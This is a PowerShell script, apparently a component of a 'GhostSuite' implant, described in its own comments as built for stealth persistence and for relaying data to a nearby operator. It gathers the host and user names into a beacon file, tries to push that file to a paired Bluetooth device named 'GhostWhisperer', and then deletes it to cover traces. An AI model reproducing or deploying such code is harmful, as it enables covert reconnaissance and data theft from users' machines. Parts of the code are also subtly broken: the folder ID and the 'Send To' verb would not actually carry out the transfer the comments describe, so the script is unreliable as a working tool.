
# GhostBLEConnect.ps1
# Simulated Bluetooth 'connection' via file drop to paired devices (OBEX push)
# Designed for stealth persistence and data relay to nearby operator

$targetName = "GhostWhisperer"
$transferFile = "$env:TEMP\ghost_ping.txt"
$ghostTag = "GX" + (Get-Random -Minimum 1000 -Maximum 9999)

function Write-StatusPayload {
    $payload = @"
GhostSuite Signal Beacon
------------------------
Host: $env:COMPUTERNAME
User: $env:USERNAME
Tag: $ghostTag
Timestamp: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Status: heartbeat
"@
    Set-Content -Path $transferFile -Value $payload -Encoding ASCII
}

function Send-OverBluetooth {
    $shellApp = New-Object -ComObject Shell.Application
    $btFolder = $shellApp.Namespace(26)  # Bluetooth devices virtual folder

    $btDevices = $btFolder.Items() | Where-Object {
        $_.Name -like "*$targetName*"
    }

    if ($btDevices.Count -eq 0) {
        Write-Host "[!] No nearby paired Bluetooth device named $targetName found."
        return
    }

    foreach ($device in $btDevices) {
        try {
            Write-Host "[*] Sending beacon to $($device.Name)..."
            $device.InvokeVerb("Send To")  # Simulate context menu action
            Start-Sleep -Seconds 1
            Start-Process -FilePath $transferFile
        } catch {
            Write-Host "[-] Failed to send to $($device.Name)"
        }
    }
}

Write-StatusPayload
Send-OverBluetooth
Remove-Item -Path $transferFile -Force -ErrorAction SilentlyContinue
